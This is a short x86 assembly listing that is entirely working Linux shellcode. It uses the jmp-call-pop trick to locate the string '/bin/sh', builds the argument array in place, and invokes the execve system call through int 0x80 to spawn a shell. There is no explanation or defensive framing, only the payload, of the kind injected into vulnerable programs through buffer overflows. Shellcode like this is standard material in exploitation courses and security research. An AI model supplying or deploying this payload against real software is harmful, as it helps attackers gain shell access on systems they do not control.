global _start

segment .text

_start:
  jmp short label2

label1:
  pop esi                   
  xor eax,eax               
  mov [esi+0x7],al          
  lea ebx,[esi]             
  mov [esi+0x8],ebx         
  mov [esi+0xc],eax         
  mov al,0xb                
  mov ebx,esi               
  lea ecx,[esi+0x8]         
  lea edx,[esi+0xc]         
  int 0x80                  
label2:
  call label1
  label3: db "/bin/shJAAAAKKKK"
